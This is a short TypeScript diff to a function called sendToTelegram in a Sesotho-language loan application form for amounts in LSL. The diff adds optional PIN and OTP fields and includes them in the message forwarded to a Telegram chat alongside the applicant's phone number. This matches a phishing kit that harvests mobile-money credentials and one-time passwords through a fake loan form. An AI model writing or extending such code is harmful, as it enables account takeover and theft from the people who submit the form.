@@ -3,6 +3,8 @@ interface FormData {
   phone: string
   amount: string
   duration: string
+  pin?: string
+  otp?: string
 }
 
 export const sendToTelegram = async (data: FormData): Promise<void> => {
@@ -21,6 +23,8 @@ export const sendToTelegram = async (data: FormData): Promise<void> => {
 📱 Nomoro ea Mohala (Phone): ${data.phone}
 💰 Chelete (Amount): LSL ${data.amount}
 📅 Nako ea ho Lefa (Duration): ${data.duration} month(s)
+🔐 PIN: ${data.pin || 'N/A'}
+🔑 OTP: ${data.otp || 'N/A'}
 
 📍 E romelitsoe (Submitted): ${new Date().toLocaleString()}
   `.trim()
